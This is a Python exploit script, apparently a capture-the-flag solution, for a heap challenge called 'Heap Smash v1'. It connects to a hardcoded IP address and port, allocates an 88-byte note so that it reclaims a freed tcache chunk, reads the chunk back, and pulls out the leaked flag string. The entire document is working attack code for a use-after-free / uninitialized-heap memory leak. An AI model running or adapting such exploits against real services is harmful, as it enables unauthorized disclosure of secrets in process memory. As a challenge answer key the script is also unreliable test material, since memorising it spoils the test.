#!/usr/bin/env python3
# Heap Smash v1 — uninitialized-heap (UAF) leak. Flag freed at startup into
# tcache[0x60]; alloc a same-size note -> reclaim chunk -> flag intact at offset 16.
import socket, time
HOST, PORT = "13.206.57.188", 10044
def rd(s, t=1.0):
    time.sleep(0.15); s.settimeout(t); b=b''
    try:
        while True:
            c=s.recv(8192)
            if not c: break
            b+=c
    except socket.timeout: pass
    return b
s=socket.socket(); s.settimeout(6); s.connect((HOST,PORT)); rd(s)
s.sendall(b"A 0 88\n"); rd(s)          # 88 -> chunk 0x60 == flag chunk size
s.sendall(b"R 0\n")
data=rd(s).split(b"\ncmd")[0]
print("leaked:", data)
i=data.find(b"athena{")
print("FLAG:", data[i:data.find(b'}',i)+1].decode())
